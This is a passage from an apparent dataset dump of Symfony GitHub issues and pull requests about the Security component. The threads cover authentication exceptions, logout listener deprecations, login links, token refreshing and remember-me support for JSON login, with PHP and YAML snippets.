If there is no token set (i.e. the user is not authenticted at all) or the exception attribute is set to 'IS_AUTHENTICATED_FULLY', the authentication process will start (e.g. redirecting to the login page). Else, a simple access denied exception is thrown.

I'm now able to explicitly secure resources (with controller attributes for example):
```
#[Route('/admin', name: 'admin_index')]
#[isGranted('IS_AUTHENTICATED_FULLY')]
public function indexAction(): Response { ... }
```

I can customize the behaviour of the authentication process by overriding the _start()_ method of class _Symfony\Component\Security\Http\Authenticator\AbstractLoginFormAuthenticator_ ([documentation](https://symfony.com/doc/current/security/custom_authenticator.html)):
```
class LoginFormAuthenticator extends AbstractLoginFormAuthenticator {

    ...

    public function start(Request $request, AuthenticationException $authException = null): Response
    {
        $authenticationTrustResolver = new AuthenticationTrustResolver();
        if ($authenticationTrustResolver->isRememberMe($authException->getToken())) {
            // user is remembered - add flash message that being remembered won't suffice for accessing this resource
            dd('insufficient authentication');
        }

        if (!$authException->getToken()) {
            // visitor is not authenticated at all - add flash message that he/she needs to login, so access rights can be evaluated
            dd('no authentication at all');
        }

        // redirect to login page where the appropriate flash message will be displayed
        $url = $this->getLoginUrl($request);

        return new RedirectResponse($url);
    }

    ...

}
```
Here, it would be cleaner to be able to differentiate between a no authentication exception and an insufficient authentication exception (as per uncaught's initial proposal). It would make it possible to check which kind of exception was thrown instead of examining the token. But regardless, it works...> I'd still prefer the separation of authorization and authentication

With the changes the separation will at least be a bit more clear. If you wanted to split hairs, the whole idea of `IS_AUTHENTICATED_FULLY` as *role* check is weird in the first place. You basically ask the *authorization* system whether the user is *authenticated* or not. But then again, without authentication, you can't have authorization, so triggering it, is still somewhat fine.

> After trying to implement @uncaught's solution (which unfortunately doesn't work due to _isGranted()_ & _denyAccessUnlessGranted()_ not allowing an array of attributes)

Oh, I didn't know that was dropped with Symfony 5. I'm still on 4, but never used arrays anyway, so I guess I've never seen the deprecation notices about it. Weird that the AccessDescisionManager keeps using arrays though.

And now I see that with Symfony 6 the AuthorizationChecker no longer authenticates the user if they are not authenticated. So I suppose I am a bit outdated. I don't know at which point the user gets authenticated anymore. Is that code in the ExceptionListener the only thing left that starts the authentication? Then your suggestion to check for a `null` token seems logical.

Although the fact that they left the attributes in there as array makes me a bit nervous because your code assumes that the IS_AUTHENTICATED_FULLY was in fact the attribute that failed. So I'd still leave the `isFullyFledged` check in there to be safe:

```diff
// Symfony\Component\Security\Http\Firewall\ExceptionListener
- if (!$this->authenticationTrustResolver->isFullFledged($token)) { ... }
+ if (null === $this->tokenStorage->getToken() || in_array('IS_AUTHENTICATED_FULLY', $exception->getAttributes()) && !$this->authenticationTrustResolver->isFullFledged($token)) { ... }
```

Or I might be paranoid.Well, your authorization layer is perfectly legitimate to grant or reject a permission based on the level of trust of the authentication.

And my answer was about logic that you might implement in custom voters. `->isGranted('ACCESS_ADMINISTRATION_AREA')` might rely on the trust level to take a decision.",no,"Security,Enhancement,Status: Waiting feedback,"
symfony/symfony,1034126191,"[Security] Deprecate LogoutListener being returned as 3rd element by FirewallMapInterface::getListeners","| Q             | A
| ------------- | ---
| Branch?       | 5.4
| Bug fix?      | no
| New feature?  | no
| Deprecations? | yes
| License       | MIT

[As discussed](https://github.com/symfony/symfony/pull/43548#issuecomment-945187951) with @chalasr, I'm adding these deprecations in preparation for #43548, which is targeting Symfony 6.0.

---

**What's this PR about?**

The 3rd element in the array returned by `FirewallMapInterface::getListeners()` containing the `LogoutListener` will be deprecated. Instead, in Symfony 6.0 the logout listener will be included in the first element, which is then containing _all_ firewall listeners and removing some unnecessary complexity (-> #43548).

This change is a follow-up of introducing the ability to sort security listeners, which was introduced in #37337. There is no longer the need for treating the `LogoutListener` as a special case to get its execution order right.","@scheb Do you think you can work on this one soon? We are closing 5.4 for new features.I got time this weekend!

My suggestion would be to combine adding the new methods ([as discussed here](https://github.com/symfony/symfony/pull/43674#discussion_r734964198)) with the changes from #43548 and target 5.4. With new methods added and the existing method becoming deprecated, it should be possible to do it all at once within the 5.4 release.Force-pushed a draft to deprecate `getListeners` method and add `getFirewallListeners` and `getExceptionListener` as a replacement. Didn't touch the tests yet, would like to get some feedback first if this would be the way to go.

Considerations:
- Wasn't sure of constructor arguments need to be kept backwards compatible. Since `FirewallContext` and `LazyFirewallContext` are somewhat internal to security-bundle, I went with changing them.
- Came to the conclusion that deprecation _and_ #43548 can't be done both in 5.4, because there's no guarantee the new methods are actually implemented by the user.> would like to get some feedback first if this would be the way to go.

To me it is, yes 👍 .

> Wasn't sure of constructor arguments need to be kept backwards compatible. Since FirewallContext and LazyFirewallContext are somewhat internal to security-bundle, I went with changing them.

We cannot remove them as these classes are not marked as internal. We need to deprecate these constructor parameters first (happy to help with the BC layer.)

> Came to the conclusion that deprecation and [Security] Remove sorting of security listeners at runtime from Firewall #43548 can't be done both in 5.4, because there's no guarantee the new methods are actually implemented by the user.

Indeed.> We cannot remove them as these classes are not marked as internal. We need to deprecate these constructor parameters first (happy to help with the BC layer.)

@chalasr Ok, that was what I was afraid of 😟. For derprecating arguments at the end of the argument list it's easy, make it optional and trigger deprecation warning when it's set. Though for arguments in between I'm not really sure how to proceed. Can you point me to an example how to approach this? We could also have a chat on Slack, since that works better for back and forth comms.> Though for arguments in between I'm not really sure how to proceed. Can you point me to an example how to approach this?

See e.g: https://github.com/symfony/symfony/blob/0d15daff2950d619ecebb447efdecbf93decb8db/src/Symfony/Component/Security/Http/Firewall/AccessListener.php#L42-L59

Basically:
- Update the argument list to match the new signature
- Remove all type hints from the removed argument to the end of the argument list
- Check one instanceof to see if the old or new signature is used, and activate the BC layer when necessarySo here's a suggestion. The fabbot.io failing seems to be unrelated to my changes. 

Considerations:

- The fact that `$listeners` is an iterable makes things messy when trying to ensure the `LogoutListener` is contained, since it can be either an array or a (lazy-loaded) iterator. Tried to not mess up the lazy-loading iterators.
- `LazyFirewallContext` extending the constructor makes things complicated. Decided to just get the argument that matters for that class (the `$tokenStorage`) from the constructor arguments and push other responsibilities down to be handled in the `FirewallContext` superclass.",yes,"Security,Status: Needs Work,Deprecation,"
symfony/symfony,1350947912,"Possibility to enable/disable authenticators using conditions / config","### Description

Sometimes in applications you wants to implement and provide support for multiple authenticators (FormLogin, OAuth, Ldap, etc) but in case you deploy the same application as a product for different clients / environments, you need to enable / disable some authenticators. 

It's currently possible to modify the security.yml file but in case you deploy Docker images, it seems to be a bad option. I'm not sure what can be the best way to enable such authenticators. Maybe the best is to manage this activation by checking an ``activeXXX`` parameter in ``support`` method of each authenticator?

In such case it means we are obliged to replace the Symfony FormLoginAuthenticator to override the support method?

Or maybe the best is to protect the authentication routes using ``access_control`` to produce an Access Denied when an authenticator is not enabled (using an expression with ``allow_if``).

Eg.:
``` 
        - { path: ^/secured/login, allow_if: ""'%env(AUTH_PROVIDERS)%' contains 'form' and is_granted('PUBLIC_ACCESS')"" }
        - { path: ^/secured/oidc/connect, allow_if: ""'%env(AUTH_PROVIDERS)%' contains 'oidc' and is_granted('PUBLIC_ACCESS')"" }
        - ...
        - { path: ^/api/login, allow_if: ""'%env(AUTH_PROVIDERS)%' contains 'api' and is_granted('PUBLIC_ACCESS')"" }
        - { path: ^/api,       allow_if: ""'%env(AUTH_PROVIDERS)%' contains 'api' and is_granted('IS_AUTHENTICATED_FULLY')"" }
```

Do you have better idea?

### Example

_No response_",,no,"Security,Feature,"
symfony/symfony,1110756112,"[Security] Authorization Matrix (""What can my object do?"")","### Description

The current voter system answers to the question ""Can my object do this?"".

It's very common to ask the reverse question ""What can my object do?"". For example, an endpoint API could return

```json
{
  ""id"": 100,
  ""can_edit"": true,
  ""can_delete"": false
}
```

to indicate to the front that the delete button has to be disabled.

There is no built-in mechanism in Symfony to achieve this at the moment. 

### Example

I did a [POC](https://github.com/maidmaid/symfony-demo/pull/2) based on Symfony Demo to fill this need. For each Post entity, we can know the state of each supported actions :

![image](https://user-images.githubusercontent.com/4578773/150577566-06e4403f-523b-484a-beee-67b47af48ff3.png)

That looks totally possible to develop such feature. What do you think ?",,no,"Security,"
symfony/symfony,1375537088,"[Security][DX] Deprecate/warn having the security bundle loaded, but not having any config","### Symfony version(s) affected

5.4.11

### Description

Currently, if you don't have any security config, the Security bundle skips loading any of its conifg:

https://github.com/symfony/symfony/blob/308edb55684f7afb3670414a6a69443551bf2e4d/src/Symfony/Bundle/SecurityBundle/DependencyInjection/SecurityExtension.php#L90-L92

This can lead to weird errors like:
```
Did you forget to run ""composer require symfony/twig-bundle""? Unknown function ""is_granted"" in ""template.html.twig"".
```

The developer is left to debug why Twig bundle is not being loaded, why the Security bundle is not loaded (they both are) (I'd argue that this itself is a bug).

### How to reproduce

1. Create a new symfony project
2. don't define any security
3. try to use some security related feature (like the mentioned Twig function) and see the error message

### Possible Solution

- warn about security not having any config (AFAIK it needs at least one firewall)
- load some (most) services into the container even without the config

### Additional Context

This happens if you're setting up a tiny Symfony app for functional tests where you need the smallest working config, you might omit things you're not directly interested in, but that can have unintended consequences which are hard to debug.","👍 I can't recall any decision regarding this and I can't find anything in the history that justifies it.
Making it throw is likely to break some setups at least in test, which is not desired on a LTS version. I would handle this as a DX enhancement and trigger a deprecation notice at first.",no,"Security,Bug,DX,Status: Needs Review,"
symfony/symfony,1189696637,"[SecurityBundle] Allow specifying attributes for `RequestMatcher`","| Q             | A
| ------------- | ---
| Branch?       | 6.1
| Bug fix?      | no
| New feature?  | yes
| Deprecations? | no
| Tickets       | Fix #45901
| License       | MIT

The \Symfony\Component\HttpFoundation\RequestMatcher supports array $attributes, which makes it possible to specify a _route (useful e.g. in a multilingual project where $path is translated). However, its current configuration does not offer the possibility to specify the attributes. This PR adds this possibility, so this already existing feature can be leveraged.
I also added a shortcut to just specify ""route"": ""xxx"", which translates to ""attributes"": [""_route"": ""xxx""].
","Hey!

To help keep things organized, we don't allow ""Draft"" pull requests. Could you please click the ""ready for review"" button or close this PR and open a new one when you are done?

Note that a pull request does not have to be ""perfect"" or ""ready for merge"" when you first open it. We just want it to be ready for a first review.

Cheers!

CarsonbotHey!

I see that this is your first PR. That is great! Welcome!

Symfony has a [contribution guide](https://symfony.com/doc/current/contributing/index.html) which I suggest you to read.

In short:
- Always add tests
- Keep backward compatibility (see https://symfony.com/bc).
- Bug fixes must be submitted against the lowest maintained branch where they apply (see https://symfony.com/releases)
- Features and deprecations must be submitted against the 6.1 branch.

Review the GitHub status checks of your pull request and try to solve the reported issues. If some tests are failing, try to see if they are failing because of this change.

When two Symfony core team members approve this change, it will be merged and you will become an official Symfony contributor!
If this PR is merged in a lower version branch, it will be merged up to all maintained branches within a few days.

I am going to sit back now and wait for the reviews.

Cheers!

CarsonbotHey!

I think @monteiro has recently worked with this code. Maybe they can help review this?

Cheers!

CarsonbotThanks for the PR.

Please rebase and target 6.1 since that's a new feature. Please also update the description of the PR a bit so that ppl that wonder about what the attached patch does can have some clues (eg to start writing the doc about this).
Then, please add a line in the CHANGELOG file of the bundle, and please add a test case if possible :pray: @carsonbot please find me a reviewer@freiondrej-lmc Thanks for the PR!

> @carsonbot please find me a reviewer

The 6.1 branch is feature-frozen, as such the current focus should be about stabilizing 6.1. So this is for 6.2 and we have 6 months to review and fine-tune it.@chalasr thanks for the information :) just so I know, when was the feature freeze? (so that I can plan better the next time)@freiondrej-lmc 2 months before the release, so end of MarchSee https://symfony.com/doc/current/contributing/community/releases.html#developmentI don't really understand why the tests fail now, when prior to my fixup commit https://github.com/symfony/symfony/pull/45907/commits/4983fd5ccaaa16fa3bf701fb1e89eb23b84fa7ef they passed and I don't see how it could have broken it ... any suggestions would be very welcome 🙂 > I don't really understand why the tests fail now, when prior to my fixup commit https://github.com/symfony/symfony/commit/4983fd5ccaaa16fa3bf701fb1e89eb23b84fa7ef they passed and I don't see how it could have broken it ... any suggestions would be very welcome 🙂

I think you can ignore the failing test case, its from another PR> > I don't really understand why the tests fail now, when prior to my fixup commit [4983fd5](https://github.com/symfony/symfony/commit/4983fd5ccaaa16fa3bf701fb1e89eb23b84fa7ef) they passed and I don't see how it could have broken it ... any suggestions would be very welcome 🙂
> 
> I think you can ignore the failing test case, its from another PR

@OskarStark 

Well most of it is, but also mine: 
```
1) Symfony\Bundle\SecurityBundle\Tests\DependencyInjection\SecurityExtensionTest::testRegisterAccessControlWithSpecifiedAttributes
[961](https://github.com/symfony/symfony/actions/runs/3098415653/jobs/5016303268#step:8:1006)
Failed asserting that an array has the key 4.
[962](https://github.com/symfony/symfony/actions/runs/3098415653/jobs/5016303268#step:8:1007)

[963](https://github.com/symfony/symfony/actions/runs/3098415653/jobs/5016303268#step:8:1008)
/home/runner/work/symfony/symfony/src/Symfony/Bundle/SecurityBundle/Tests/DependencyInjection/SecurityExtensionTest.php:360
[964](https://github.com/symfony/symfony/actions/runs/3098415653/jobs/5016303268#step:8:1009)

[965](https://github.com/symfony/symfony/actions/runs/3098415653/jobs/5016303268#step:8:1010)
2) Symfony\Bundle\SecurityBundle\Tests\DependencyInjection\SecurityExtensionTest::testRegisterAccessControlWithSpecifiedRoute
[966](https://github.com/symfony/symfony/actions/runs/3098415653/jobs/5016303268#step:8:1011)
Failed asserting that an array has the key 4.
```
https://github.com/symfony/symfony/actions/runs/3098415653/jobs/5016302933
Indeed, sorry I just saw the following:
<img width=""861"" alt=""CleanShot 2022-09-21 at 23 11 16@2x"" src=""https://user-images.githubusercontent.com/995707/191611274-63fbe76c-ffc0-4944-9f35-a0c3ba61bf10.png"">
@OskarStark I now ran the tests locally and I did not get this error with my code. Maybe there are some changes from a different PR involved? I don’t know the details of the pipeline and how isolated the PRs are from each other 😕 any help will be much appreciated! @OskarStark any ideas would be very welcome. Will this PR even make it into 6.2? ",yes,"Feature,SecurityBundle,Status: Needs Review,"
symfony/symfony,1335198485,"[Security] Adding a Flash Message still not working in Logout Subscriber","### Symfony version(s) affected

5.4.11

### Description

It looks like the problem described in https://github.com/symfony/symfony/issues/37292 wasn't solved completely in https://github.com/symfony/symfony/pull/37368.

I have a `LogoutSubscriber` that adds a flash message, and this gets lost.

### How to reproduce

LogoutSubscriber:
```php
public static function getSubscribedEvents(): array
{
    return [
        LogoutEvent::class => ['logout', 0],
    ];
}
```
Workaround: Setting the priority to `-1`, solves it, as suggested in https://github.com/symfony/symfony/issues/37292#issuecomment-646992227

### Possible Solution

If this can't be fixed, I'd come up with a PR for https://symfony.com/doc/5.4/security.html#customizing-logout - something like ""Due to Symfony internals, when using an event subscriber to add a flash message, you need to set a negative priority, as shown here:...""

### Additional Context

_No response_",,no,"Security,Bug,Status: Needs Review,"
symfony/symfony,1097760157,"LoginLink in localized paths does not work as in non localized paths","### Symfony version(s) affected

master

### Description

When having the routing system under localized routes, the localized paths do not call the internal action defined in security.yaml: login_link -> check_route

### How to reproduce

I have a small app that reproduces it here: https://github.com/samuelvi/bug-symfony-login-link-localization-reproducer

Here you are some urls (requires start the built-in server):

Checking that the localized routing works properly:

- http://localhost:8000/hello-world => should display ""Hello World""
- http://localhost:8000/en-us/hello-world => should display ""Hello World""
- http://localhost:8000/es-es/hello-world => should display ""Hello World""


Checking that the LoginLink internal routing behaves differently, depending on the localized route:

- http://localhost:8000/user/login-check => Shows ""Login Check""
- http://localhost:8000/es-es/user/login-check => Redirects to the login page

### Possible Solution

_No response_

### Additional Context

_No response_","Hey, thanks for your report!
There has not been a lot of activity here for a while. Is this bug still relevant? Have you managed to find a workaround?Hi,
The issue still persist I am afraid (just checked the demo project I posted in this issue post).
I had to implement a hack into my project, for it to work properly, it's a bit strange but works (hoping a fix :) ) 

In security.yaml, firewalls->main section:

security:
    firewalls:
        main:
            login_link:
                check_route: login_check

Then I have a controller with a duplicated path:

    /**
     * @Route(""/user/login-check"", name=""login_check_localized"")
     */
    public function localizedLoginCheckAction(Request $request): RedirectResponse
    {
        return $this->loginCheckAction($request);
    }

    /**
     * @Route(""/user/login-check"", name=""login_check"")
     */
    public function loginCheckAction(Request $request): RedirectResponse
    {
       .... The code
    }

",no,"Security,Bug,Status: Needs Review,"
symfony/symfony,1098045464,"[Security] Login link with custom router params and query params","| Q             | A
| ------------- | ---
| Branch?       | 6.1 for features
| Bug fix?      | no
| New feature?  | yes
| Deprecations? | no
| Tickets       |  This is in part related to https://github.com/symfony/symfony/issues/41151
| License       | MIT
| Doc PR        | https://github.com/symfony/symfony-docs/pull/16385

Hey there :) !

In the company I work for, we had the need of using an autologin system without using database, so LoginLink seamed to fit our needs, but, because of the requirements of the company's project we had 2 needs:

- Allowing to customize the host based on a router variable called site (instead of locale)
- Allowing to pass the uri to which the user will be internally redirected, after a success login. We pass this uri encrypted, (the way is encrypted is out of this topic )

So in the pull request the strategy is: allowing to pass custom router variables and additional url parameters to the login link. Apart from this allowing the customization of route_name and lifetime in a non global way. This gives us certain flexibility, a change that I also proposed in this pull request because we saw it had certain demand (see related ticket).

Had to change the signature of createLoginLink, in LoginLinkHandlerInterface
Had to modify createLoginLink in LoginLinkHandler
Had to modify createLoginLink in FirewallAwareLoginLinkHandler
Had to adapt the tests found in: phpunit src/Symfony/Component/Security/Http/Tests/LoginLink

As far as I know, there could be a backward compatibility if some one used LoginLinkHandlerInterface in their project, because the signature changes although the array $options parameter is optional and initialized to empty [].

Thank you very much in advance!","Hey!

I see that this is your first PR. That is great! Welcome!

Symfony has a [contribution guide](https://symfony.com/doc/current/contributing/index.html) which I suggest you to read.

In short:
- Always add tests
- Keep backward compatibility (see https://symfony.com/bc).
- Bug fixes must be submitted against the lowest maintained branch where they apply (see https://symfony.com/releases)
- Features and deprecations must be submitted against the 6.1 branch.

Review the GitHub status checks of your pull request and try to solve the reported issues. If some tests are failing, try to see if they are failing because of this change.

When two Symfony core team members approve this change, it will be merged and you will become an official Symfony contributor!
If this PR is merged in a lower version branch, it will be merged up to all maintained branches within a few days.

I am going to sit back now and wait for the reviews.

Cheers!

CarsonbotIMO these two features should be done separately.See eg https://github.com/symfony/symfony/pull/43982/files for how to add an argument without breaking BC.",yes,"Security,Feature,Status: Needs Review,"
symfony/symfony,930132505,"Use the new Authentication Manager to refresh User Token with new roles","Before **Symfony 5.3**, I had a Listener that listened to requests and checked each time if the roles of the authenticated user had changed, in which case it refreshed its token.

This allowed the user to automatically benefit from its new features if their role were to change (something which can happen very often in my application).

I realized it like this:

```php
class RequestSubscriber implements EventSubscriberInterface
{

    public function __construct(
        private TokenStorageInterface $tokenStorage,
    ){}

    public static function getSubscribedEvents(): array
    {
        return [
            KernelEvents::REQUEST => 'onRequest',
        ];
    }

    public function onRequest(RequestEvent $event): void
    {
        if (!$event->isMainRequest()) {
            return;
        }

        if (!$token = $this->tokenStorage->getToken()) {
            return;
        }

        $sessionUser = $token->getUser();

        if ($sessionUser instanceof User) {
            $this->tokenStorage->setToken(new PostAuthenticationGuardToken($sessionUser, 'main', $sessionUser->getRoles()));
        }
    }
}
```

But since Symfony 5.3, we have to use the new authenticator. Which gives me a depreciation:

> User Deprecated: Since symfony/security-guard 5.3: The ""Symfony\Component\Security\Guard\Token\PostAuthenticationGuardToken"" class is deprecated, use the new authenticator system instead.

This is because of this line :

`$this->tokenStorage->setToken(new PostAuthenticationGuardToken($sessionUser, 'main', $sessionUser->getRoles()));`

But there is no indication, telling us which class to use to refresh the token with the new authenticator","Maybe this will help

src/Symfony/Component/Security/Http/Authenticator/Token/PostAuthenticationToken.php

replace
`$this->tokenStorage->setToken(new PostAuthenticationGuardToken($sessionUser, 'main', $sessionUser->getRoles()));`
to
`$this->tokenStorage->setToken(new PostAuthenticationToken($sessionUser, 'main', $sessionUser->getRoles()));`
This is something that could be great for UX if we could easily update user's roles after login.

It's cumbersome and not so easy actually in my opinion.

We could load them with the UserInterface::getRoles, but i don't think other methods work like user provider for example to update them, or listen for auth events work, i tried them.

Could be great to be able to have a service for advanced roles loading. Like, get the request to check some params or session for some data to get the context and decide which roles user needs to have.Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?Friendly reminder that this issue exists. If I don't hear anything I'll close this.Yes, it could be a nice feature",no,"Security,Feature,"
symfony/symfony,1187800084,"[SecurityBundle] Allow specifying attributes._route for RequestMatcher","### Description

Currently, `Symfony\Bundle\SecurityBundle\DependencyInjection\SecurityExtension::createRequestMatcher()` accepts parameter `$attributes`, which I think could be used to specify attributes: {_route: route.id} to match a route instead of path (which I think is more useful for multilingual projects). However, currently it is not possible to actually use this because `Symfony\Bundle\SecurityBundle\DependencyInjection\SecurityExtension::createAuthorization()` (which calls `$this->createRequestMatcher()`) ends with `$access['ips']`, does not use the $attributes parameter at all.

### Example

```yml
security:
   access_control:
      - { attributes: {_route: route_id}, roles: ROLE_USER }
```
or even
```yml
security:
   access_control:
      - { route: route_id, roles: ROLE_USER }
```
(which would require additional code and docs changes)","Hello @freiondrej-lmc, ability to match a request attribute would be a great feature but rare feature. It could be handled in a more generic way, using the ExpressionLanguage component ; like the routing: https://symfony.com/doc/current/routing.html#matching-expressionsSorry, my last comment is off-topic. Your proposition is logical. It would works because the `FirewallListener` is called after the `RouterListener`.",no,"Security,Feature,"
symfony/symfony,1232550212,"[Security] Allow disabling redirect on logout","| Q             | A
| ------------- | ---
| Branch?       | 6.2
| Bug fix?      | no
| New feature  | yes
| Deprecations | no
| License       | MIT
| Doc PR        |

When using JSON authentication, customizing the success response can be done easily in the corresponding controller, but customizing the logout success is more tiresome and requires to create a listener for it (while still requiring to create a route for it to work).

This PR propose to add the possibility to disable the redirect on successful logout and let the request fallback to the defined route in this case.

This allow customizing both login and logout response in the same place like this:
```yaml
security:
    firewalls:
        main:
            json_login:
                check_path: auth_login
            logout:
                path: auth_logout
                target: ~
```

```php
class AuthController extends AbstractController
{
    #[Route(""/login"", name: ""auth_login"")]
    public function login(): Response
    {
        return $this->json($this->getUser());
    }

    #[Route(""/logout"", name: ""auth_logout"")]
    public function logout(): Response
    {
        return $this->json(null);
    }
}
```

It means I had to remove the Exception in case no logout listener set a response but I don't think it should be considered a BC break since it's an error case that is removed and the corresponding exception was just the base `RuntimeException` and thus wasn't specifically catchable.

The only downside is that other logout listeners can't modify the response anymore because it doesn't exists in the event but since this is an opt-in feature I don't think it's a problem.","Hey!

I think @scheb has recently worked with this code. Maybe they can help review this?

Cheers!

Carsonbot",yes,"Security,Status: Needs Review,"
symfony/symfony,1094387686,"AuthorizationChecker still uses $this->authenticationManager (while not set) when token isn't authenticated","### Symfony version(s) affected

5.4

### Description

In the AuthorizationChecker `isGranted` `$this->authenticationManager->authenticate($token)` is called when the token is not authenticated. `$this->authenticationManager` however is only set in an if-statement in the constructor, leading to a situation where it can be called while not set. 

This happens specifically with a http_basic user without roles, for which `$token->isAuthenticated` will return false.

### How to reproduce

Set up a http_basic memory user: 
```
    providers:
        http_basic:
            memory:
                users:
                    username:
                        password: password
```

Set up a firewall using this provider:
```
    firewalls:
        healthcheck:
            pattern: ^/testcheck
            http_basic:
                provider: http_basic
```

Call the endpoint, using an `isGranted('IS_AUTHENTICATED_REMEMBERED')` (or another attribute) to decide if the user is allowed access to the endpoint.

The `$accessDecisionManager` in the `AuthorizationChecker` will be a `TraceableDecisionManager` which is not an instance of `AuthenticationManagerInterface` so `$this->authenticationManager` will not be set.

However on line 85 `$this->authenticationManager->authenticate()` will be called.

### Possible Solution

_No response_

### Additional Context

![image](https://user-images.githubusercontent.com/97174357/148230541-3de9dae2-a900-4d12-a0b8-8022e538ff52.png)","The workaround we have used is to add a (fake) role to our provider, during which the `$token->isAuthenticated()` will return true and skip the call to `$this->authenticationManager`: 

```
    providers:
        http_basic:
            memory:
                users:
                    username:
                        password: password
                        roles: ['fake_role']
```I cannot reproduce your this. Can you create a small example application that allows to reproduce your issue?> I cannot reproduce your this. Can you create a small example application that allows to reproduce your issue?

@xabbuh here you go: https://gitlab.com/IvDooijewaard/symfony44919/-/tree/mainHm, that's a tricky issue for which I have no idea yet on how to fix it. But it only occurs when the token for the currently logged in user is not authenticated. In your example that's the case because your user does not have any roles. You can work around that by assigning some kind of dummy role to your users.",no,"Security,Bug,Status: Needs Review,Status: Waiting feedback,"
symfony/symfony,865791456,"Allow Remember Me cookie with JSON Login","**Description**
When setting up an SPA, especially when using a framework like InertiaJS, you can use `json_login` to handle user's login, and delegate the login system to Symfony and the PHPSESSID cookie.

We should be able to use the `remember_me` flag to get a `REMEMBERME` cookie alongside the session cookie.

**Example**
We could for instance activate the option in `security.yaml` like it's already available for the `form_login` key.","Just had the same problem with a Vue.js based frontend towards a simple Symfony API backend used for UI interactions.

I also read through the comments in #29729, and I'm pretty confused now.

- The command `debug:config security` documents a `json_login.remember_me` setting that defaults to true, but it does not seem to work?
- Is `JsonLoginAuthenticator` assumed to be stateless or not by default? I get the impression it is, just because it handles POST with `application/json` instead of something like `application/x-www-form-urlencoded`.
- As `JsonLoginAuthenticator` implements `InteractiveAuthenticatorInterface` I would've assumed it supports the same feature set as the other interactives, like `FormLoginAuthenticator`. I can't find a hint about why it is not feature complete nor that is it considered stateless, looking through the `authenticate` methods of the listener. The passport just does not attach a remember me badge.
- Is httpOnly/sameSite cookie approach not considered secure/viable enough for reactive frontends, regardless if we auth via form or json?It is currently not working, because 1) the JsonLoginAuthenticator is not adding a RememberMeBadge like e.g. the FormAuthenticator and 2) the CheckRememberMeConditionsListener checks only Request params like query params or POST form vars for the remember me value.

To fix the first problem the Passport instanciated in the JsonLoginAuthenticator's authenticate method needs to get a third parameter

```php
$passport = new Passport(
    new UserBadge($credentials['username'], [$this->userProvider, $method]),
    new PasswordCredentials($credentials['password']),
    [new RememberMeBadge()] // <-- This is new
);
```

For the second problem you can either modify the CheckRememberMeConditionsListener's onSuccessfulLogin method and change the part where the parameter is fetched, so instead
```php
$parameter = ParameterBagUtils::getRequestParameterValue($event->getRequest(), $this->options['remember_me_parameter']);
```
something like

```php
$parameter = $this->getParameter($event->getRequest(), $this->options['remember_me_parameter']);
// ...
private function getParameter(Request $request, string $parameterName) {
    $parameter = ParameterBagUtils::getRequestParameterValue($request, $parameterName);
    if ($parameter !== null) {
        return $parameter;
    }
    if ($request->headers->get('Content-Type') === 'application/json') {
        $data = json_decode($request->getContent());
        if (!$data instanceof \stdClass) {
            return null;
        }
        return $data->{$parameterName} ?? null;
    }
    return null;
}+1I'm also building a SPA which uses a Symfony application on the server and I am facing the same issue.
I don't understand the position of Symfony saying that a SPA should be stateless, or at least I'm not convinced by the arguments given until now.
Stateless applications are built stateless to answer some technical or functional requirements but that doesn't mean that all applications need to be built that way.

Even the Owasp foundation is recomending using cookies instead of a JWT when possible in order to not increase the potential attack surface of the application. [See Owasp article here](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#consideration-about-using-jwt)

> Even if a JWT token is ""easy"" to use and allow to expose services (mostly REST style) in a stateless way, it's not the solution that fits for all applications because it comes with some caveats, like for example the question of the storage of the token (tackled in this cheatsheet) and others...
If your application does not need to be fully stateless, you can consider using traditional session system provided by all web frameworks...

Why not make the json login stateless by default and give the option to use cookies when needed ?> I don't understand the position of Symfony saying that a SPA should be stateless […] Even the Owasp foundation is recomending using cookies instead of a JWT when possible […] Why not make the json login stateless by default and give the option to use cookies when needed ?

If you want to have a stateless login, just set the firewall to `stateless: true`, otherwise Symfony uses cookies for storing the state.

But the problem in this issue is Symfony having an incomplete implementation of the RememberMe feature in its JsonLogin. You e.g. have the config option in Symfony\Config\Security\FirewallConfig\JsonLoginConfig but the the rest is missing a pointed out in my example above. So it's not whether to have a state or not but having a state (via cookie) and the possibility to restore that state (via another cookie).

This is how I was able to solve this using an event listener:

services.yaml
```yaml
    App\EventListener\LoginSuccessListener:
        tags:
            -   name: 'kernel.event_listener'
                event: 'Symfony\Component\Security\Http\Event\LoginSuccessEvent'
                dispatcher: security.event_dispatcher.main
```


src\EventListener\LoginSuccessListener.php
```php
<?php

namespace App\EventListener;

use Symfony\Component\Security\Http\Authenticator\Passport\Badge\RememberMeBadge;
use Symfony\Component\Security\Http\Event\LoginSuccessEvent;

class LoginSuccessListener {
    public function onSymfonyComponentSecurityHttpEventLoginSuccessEvent(LoginSuccessEvent $loginEvent) {
        $passport = $loginEvent->getPassport();
        $passport->addBadge(new RememberMeBadge());
    }
}
```@kilobyte2007 Your listener adds the RememberMeBadge but it won't set the necessary cookie because your remember me data is json-encoded in the POST body (request->content) but Symfony expects it as form data (request->attributes). Symfony will only send an expired cookie with REMEMBERME=deleted.

So you have to extend your method:

```php
<?php

namespace App\EventListener;

use Symfony\Component\Security\Http\Authenticator\Passport\Badge\RememberMeBadge;
use Symfony\Component\Security\Http\Event\LoginSuccessEvent;

class LoginSuccessListener {
    public function onSymfonyComponentSecurityHttpEventLoginSuccessEvent(LoginSuccessEvent $loginEvent) {
        $passport = $loginEvent->getPassport();
        $passport->addBadge(new RememberMeBadge());

        // Add _remember_me from JSON body to attributes
        $request = $loginEvent->getRequest();
        $data = json_decode($request->getContent());
        $request->attributes->set('_remember_me', $data->_remember_me ?? '');
    }
}
```
@baumerdev I have a similar solution as @kilobyte2007 

My subscriber:

```php
<?php

namespace App\EventSubscriber;

use Symfony\Component\EventDispatcher\EventSubscriberInterface;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\RememberMeBadge;
use Symfony\Component\Security\Http\Event\LoginSuccessEvent;

class LoginSuccessSubscriber implements EventSubscriberInterface
{
    public function onLoginSuccessEvent(LoginSuccessEvent $event)
    {
        $event->getPassport()->addBadge(new RememberMeBadge());
    }

    public static function getSubscribedEvents()
    {
        return [
            LoginSuccessEvent::class => 'onLoginSuccessEvent',
        ];
    }
}
```
security.yaml
```yaml
security:
  ...
  firewalls:
    ...
    main:
      ...
      json_login:
        username_path: email
        login_path: app_login
        check_path: app_login

      login_throttling: true

      remember_me:
        secret: '%kernel.secret%'
        lifetime: 31449600 # 1 year in seconds
        signature_properties: [ password ]
        path: /

```
